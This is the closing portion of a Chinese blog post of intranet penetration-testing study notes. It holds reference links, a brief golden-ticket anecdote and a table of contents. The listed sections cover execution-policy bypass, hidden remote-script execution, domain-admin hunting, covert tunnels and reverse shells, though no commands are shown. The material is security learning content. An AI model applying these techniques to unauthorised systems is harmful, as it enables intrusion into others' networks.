<p><a target="_blank" rel="noopener" href="https://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/">内网横移之WinRM (0x0c.cc)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4">Invoke-Command (Microsoft.PowerShell.Core) - PowerShell | Microsoft Learn</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4">Enter-PSSession (Microsoft.PowerShell.Core) - PowerShell | Microsoft Learn</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gjmjack/article/details/117792465">【精选】PowerShell: 如何使用PowerShell远程登录，如何使用PowerShell建立远程会话_IT大厨的博客-CSDN博客</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers">安全标识符 | Microsoft Learn</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="http://www.nooemotion.com/2023/02/20/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-adfind/">域渗透笔记-工具使用-Adfind – NooEmotionの摆烂屋</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://m.freebuf.com/articles/web/305030.html">域渗透-跨域攻击 - FreeBuf网络安全行业门户</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/278764.html">渗透测试之地基内网篇：域森林中跨域攻击（总） - FreeBuf网络安全行业门户</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview">PowerView/SharpView - 黑客技巧 (hacktricks.xyz)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hx_chong/article/details/119809022">域渗透-跨域攻击__法老的博客-CSDN博客</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)#examples">Nltest | Microsoft Learn</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.boundaryx.com/info/2145.html">https://www.boundaryx.com/info/2145.html</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/200250.html">内网主机探测工具合集 - SecPulse.COM | 安全脉搏</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/02/24/%E5%9F%BA%E4%BA%8EMSF%E7%9A%84%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B/">https://www.mi1k7ea.com/2021/02/24/基于MSF的内网存活主机探测/</a></p>
</li>
</ul>
<h1>及辞的小彩蛋</h1>
<p>刚学完黄金票据，新买的羽绒服上拆下来的标签也是金色的卡片，像极了黄金票据，缘分总是妙不可言，浅浅记录下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121232621436.png" alt="image-20231121232621436"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121232011219.png" alt="image-20231121232011219"></p>
	  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2024/01/29/silk音频格式转mp3/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/12/24/github技巧/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-12-24 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/渗透测试/">渗透测试<span>22</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">内网常见名词解释</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1%E3%80%81%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-article-text">1、工作组</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84-Work-Group"><span class="toc-article-text">工作组 Work Group</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2%E3%80%81%E5%9F%9F"><span class="toc-article-text">2、域</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F-Domain"><span class="toc-article-text">域 Domain</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-Domain-Controller"><span class="toc-article-text">域控制器 Domain Controller</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%88%B6%E5%9F%9F%E5%92%8C%E5%AD%90%E5%9F%9F"><span class="toc-article-text">父域和子域</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%BB%E5%9F%9F"><span class="toc-article-text">主域</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%BB%E5%9F%9F%E5%92%8C%E7%88%B6%E5%9F%9F"><span class="toc-article-text">主域和父域</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E6%A0%91"><span class="toc-article-text">域树</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E6%9E%97"><span class="toc-article-text">域林</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3%E3%80%81%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="toc-article-text">3、活动目录</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4%E3%80%81DMZ"><span class="toc-article-text">4、DMZ</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5%E3%80%81%E5%9F%9F%E5%86%85%E7%9A%84%E5%90%84%E7%A7%8D%E6%9D%83%E9%99%90"><span class="toc-article-text">5、域内的各种权限</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%84"><span class="toc-article-text">组</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E5%92%8C%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7"><span class="toc-article-text">域用户和本地用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#A-G-DL-P-%E7%AD%96%E7%95%A5"><span class="toc-article-text">A-G-DL-P 策略</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">PowerShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell%E5%B8%B8%E8%AF%86"><span class="toc-article-text">PowerShell常识</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5"><span class="toc-article-text">PowerShell执行策略</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell-%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-article-text">PowerShell 运行脚本的方式</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell%E4%B8%AD%E7%9A%84%E7%AE%A1%E9%81%93"><span class="toc-article-text">PowerShell中的管道</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%8F%82%E6%95%B0"><span class="toc-article-text">PowerShell命令与参数</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E5%B9%B6%E6%89%A7%E8%A1%8CPowerShell%E8%84%9A%E6%9C%AC"><span class="toc-article-text">绕过本地权限并执行PowerShell脚本</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E5%B9%B6%E9%9A%90%E8%97%8F%E6%89%A7%E8%A1%8CPowerShell%E8%84%9A%E6%9C%AC"><span class="toc-article-text">绕过本地权限并隐藏执行PowerShell脚本</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%8B%E8%BD%BD%E8%BF%9C%E7%A8%8B%E8%84%9A%E6%9C%AC%E7%BB%95%E8%BF%87%E6%9D%83%E9%99%90%E5%B9%B6%E9%9A%90%E8%97%8F%E6%89%A7%E8%A1%8C"><span class="toc-article-text">下载远程脚本绕过权限并隐藏执行</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8-Base64-%E5%AF%B9%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81"><span class="toc-article-text">利用 Base64 对命令进行编码</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">本地工作组信息收集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1%E3%80%81%E6%89%8B%E5%8A%A8%E6%94%B6%E9%9B%86%E6%9C%AC%E5%9C%B0%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">1、手动收集本地工作组信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-article-text">基础信息收集</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE"><span class="toc-article-text">查询防火墙相关配置</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%E6%83%85%E5%86%B5"><span class="toc-article-text">查看计算机代理配置情况</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E5%B9%B6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-article-text">查询并开启远程连接服务(远程桌面)</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2%E3%80%81%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E6%9C%AC%E5%9C%B0%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">2、自动收集本地工作组信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmic-%E8%84%9A%E6%9C%AC"><span class="toc-article-text">wmic 脚本</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerShsell-Empire"><span class="toc-article-text">PowerShsell Empire</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">域内信息收集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-article-text">1、判断是否存在域</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ipconfig"><span class="toc-article-text">ipconfig</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-article-text">系统详细信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E5%9F%9F%E4%B8%8E%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-article-text">当前登录域与域用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A4%E6%96%AD%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-article-text">判断主域控制器</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2%E3%80%81%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-article-text">2、收集域内基础信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F"><span class="toc-article-text">查看域</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-article-text">查看域内所有计算机</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E7%BB%84%E5%88%97%E8%A1%A8"><span class="toc-article-text">查看域内所有用户组列表</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%94%A8%E6%88%B7%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">查看域用户组信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E4%BF%A1%E6%81%AF"><span class="toc-article-text">查看域密码策略信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%BF%A1%E6%81%AF"><span class="toc-article-text">查看域信任信息</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3%E3%80%81%E6%94%B6%E9%9B%86%E5%9F%9F%E7%94%A8%E6%88%B7%E5%92%8C%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-article-text">3、收集域用户和管理员信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-article-text">查询域用户列表</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-article-text">查询域用户详细信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%98%E5%9C%A8%E7%9A%84%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-article-text">查询存在的域用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E7%94%A8%E6%88%B7"><span class="toc-article-text">查询本地管理员组用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E7%94%A8%E6%88%B7"><span class="toc-article-text">查询域管理员组用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E4%BC%81%E4%B8%9A%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E7%BB%84%E7%94%A8%E6%88%B7"><span class="toc-article-text">查询企业系统管理员用户组用户</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4%E3%80%81%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-article-text">4、查找域控制器</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9C%BA%E5%99%A8%E5%90%8D%E5%92%8C%E4%B8%BB%E6%9C%BA%E5%90%8D%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-article-text">机器名和主机名的区别</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="toc-article-text">查看域控制器机器名</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-article-text">查看域控器主机名</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5%E3%80%81%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-article-text">5、定位域管理员</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#psloggedon"><span class="toc-article-text">psloggedon</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PVEFindADUser"><span class="toc-article-text">PVEFindADUser</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#netview"><span class="toc-article-text">netview</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap%E7%9A%84NSE-%E8%84%9A%E6%9C%AC"><span class="toc-article-text">nmap的NSE 脚本</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerView-%E8%84%9A%E6%9C%AC"><span class="toc-article-text">PowerView 脚本</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Empire"><span class="toc-article-text">Empire</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6%E3%80%81%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B"><span class="toc-article-text">6、查找域管理员进程</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8"><span class="toc-article-text">获取域管理员列表</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%97%E5%87%BA%E6%9C%AC%E6%9C%BA%E7%9A%84%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8F%8A%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7"><span class="toc-article-text">列出本机的所有进程及进程用户</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E5%9F%9F%E7%AE%A1%E7%90%86%E4%BC%9A%E8%AF%9D"><span class="toc-article-text">查询域控制器的域管理会话</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">BloodHound 的使用(滞留)</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">基本架构与内网常见软件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84Web%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84"><span class="toc-article-text">常见的Web基本架构</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6"><span class="toc-article-text">内网常见软件</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">域内网段划分</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">隐藏通信隧道技术</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1%E3%80%81%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-article-text">1、隐藏通信隧道基础知识</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E7%9A%84%E8%BF%9E%E9%80%9A%E6%80%A7-%E6%98%AF%E5%90%A6%E5%87%BA%E7%BD%91"><span class="toc-article-text">2、判断内网的连通性(是否出网)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8ICMP%E5%8D%8F%E8%AE%AE-ICMP%E8%BF%9E%E9%80%9A%E6%80%A7%E6%A3%80%E6%B5%8B"><span class="toc-article-text">使用ICMP协议(ICMP连通性检测)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8TCP%E5%8D%8F%E8%AE%AE-TCP%E8%BF%9E%E9%80%9A%E6%80%A7%E6%A3%80%E6%B5%8B"><span class="toc-article-text">使用TCP协议(TCP连通性检测)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8http%E5%8D%8F%E8%AE%AE-http%E8%BF%9E%E9%80%9A%E6%80%A7%E6%A3%80%E6%B5%8B"><span class="toc-article-text">使用http协议(http连通性检测)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8DNS%E5%8D%8F%E8%AE%AE-DNS%E8%BF%9E%E9%80%9A%E6%80%A7%E6%A3%80%E6%B5%8B"><span class="toc-article-text">使用DNS协议(DNS连通性检测)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#windows%E4%B8%8B"><span class="toc-article-text">windows下</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#linux%E4%B8%8B"><span class="toc-article-text">linux下</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3%E3%80%81%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-article-text">3、网络层隧道技术</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#IPv6%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-article-text">IPv6隧道工具使用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%98%B2%E5%BE%A1IPv6%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-article-text">防御IPv6隧道攻击的方法</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ICMP%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-article-text">ICMP隧道工具使用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ptunnel"><span class="toc-article-text">ptunnel</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#icmpsh"><span class="toc-article-text">icmpsh</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#icmptunnel"><span class="toc-article-text">icmptunnel</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%98%B2%E5%BE%A1ICMP%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-article-text">防御ICMP隧道攻击的方法</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4%E3%80%81%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-article-text">4、传输层隧道技术</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#lcx"><span class="toc-article-text">lcx</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#windows%E4%B8%8B-2"><span class="toc-article-text">windows下</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-article-text">内网端口转发</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-article-text">本地端口映射</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#linux%E4%B8%8B-2"><span class="toc-article-text">linux下</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-2"><span class="toc-article-text">内网端口转发</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#netcat"><span class="toc-article-text">netcat</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96-banner-%E4%BF%A1%E6%81%AF"><span class="toc-article-text">获取 banner 信息</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%9B%B4%E8%BF%9Eshell-%E6%AD%A3%E5%90%91shell"><span class="toc-article-text">直连shell(正向shell)</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#powercat"><span class="toc-article-text">powercat</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%AD%A3%E5%90%91shell"><span class="toc-article-text">正向shell</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%8D%E5%90%91shell"><span class="toc-article-text">反向shell</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%9C%E4%B8%BA%E8%B7%B3%E6%9D%BF%E4%BD%BF%E7%94%A8"><span class="toc-article-text">作为跳板使用</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-article-text">文件传输</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%94%9F%E6%88%90-payload"><span class="toc-article-text">生成 payload</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%AD%A3%E5%90%91shell-2"><span class="toc-article-text">正向shell</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%8F%8D%E5%90%91shell-2"><span class="toc-article-text">反向shell</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%BB%BA%E7%AB%8B-dns-%E9%9A%A7%E9%81%93%E8%BF%9E%E6%8E%A5"><span class="toc-article-text">建立 dns 隧道连接</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#socat"><span class="toc-article-text">socat</span></a><ol 